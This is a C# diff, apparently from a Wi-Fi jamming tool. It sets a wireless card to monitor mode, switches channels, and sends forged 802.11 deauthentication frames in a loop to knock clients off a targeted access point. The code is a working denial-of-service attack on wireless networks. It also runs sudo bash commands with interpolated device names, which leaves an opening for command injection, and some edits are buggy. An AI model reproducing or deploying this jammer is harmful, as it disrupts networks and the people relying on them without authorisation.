@@ -37,6 +37,11 @@ public class DeviceService : IDeviceService {
             .WithArguments(new[] {"-c", $"sudo iwconfig {deviceName} mode monitor"});
         var result = await cmd.ExecuteAsync();
 
+        // Channel 11 for testing
+        var c = Cli.Wrap("/bin/bash")
+            .WithArguments(new[] {"-c", $"sudo iwconfig {deviceName} channel 11"});
+        var r = await cmd.ExecuteAsync();
+
         // Put interface back up
         await Cli.Wrap("/bin/bash")
             .WithArguments(new[] {"-c", $"sudo ifconfig {deviceName} up"})
@@ -44,6 +49,13 @@ public class DeviceService : IDeviceService {
         return result.ExitCode == 0;
     }
 
+    public async Task<bool> ChangeChannel(int channel) {
+        Console.WriteLine("Changing channel to {0}", channel.ToString());
+        var cmd = Cli.Wrap("/bin/bash")
+            .WithArguments(new[] {"-c", $"sudo iwconfig {_captureDevice.Name} channel {channel.ToString()}"});
+        var result = await cmd.ExecuteAsync();
+        return result.ExitCode == 0;
+    }
 
     public async Task OpenDevice()
     {
@@ -73,11 +85,11 @@ public class DeviceService : IDeviceService {
                 device.SendPacket(dummyPacket);
                 await SetMonitorMode(device.Name);
                 _captureDevice =  device as IInjectionDevice;
-                device.Close();
+                //device.Close();
                 return;
 
             } catch (PcapException) { }
-              finally { device.Close(); }
+              //finally { device.Close(); }
         }
     }
 
@@ -125,6 +137,7 @@ public class DeviceService : IDeviceService {
         // Need to parse the AP BSSID (string -> bytes)
         using (var device = _captureDevice) {
             device.Open(DeviceModes.Promiscuous);
+            ChangeChannel(ap.Channel);
             string[] parts = ap.BSSID.Split(":");
             byte[] bssidBytes = new byte[parts.Length];
             for (int i = 0; i < parts.Length; i++)
@@ -141,15 +154,22 @@ public class DeviceService : IDeviceService {
                     0x00, 0x48, // Sequence garbage
                     0x07, 0x00 // Reason - 0x07, 0x00 - Class 3 frame received from nonassociated STA
             };
-            try
+            while (ap.IsJammed)
             {
-                while (ap.IsJammed)
-                {
-                    await Task.Delay(100);
-                    device.SendPacket(deauthFrame);
+                try {
+                    await Task.Delay(200);
+                    device.SendPacket(deauthFrame);   
+                }  catch (PcapException ex) { 
+                    if (ex.Message.Contains("No such device or address")) {
+                        // Device disconnected
+                        Console.WriteLine("Device disconnected");
+                    } else {
+                        Console.WriteLine("Got a PcapException - {0}", ex); 
+                        //SetMonitorMode(_captureDevice.Name);
+                        //ChangeChannel(ap.Channel);
+                    }
                 }
             }
-            catch (PcapException ex) { Console.WriteLine("Got a PcapException - {0}", ex); }
         }
     }
 
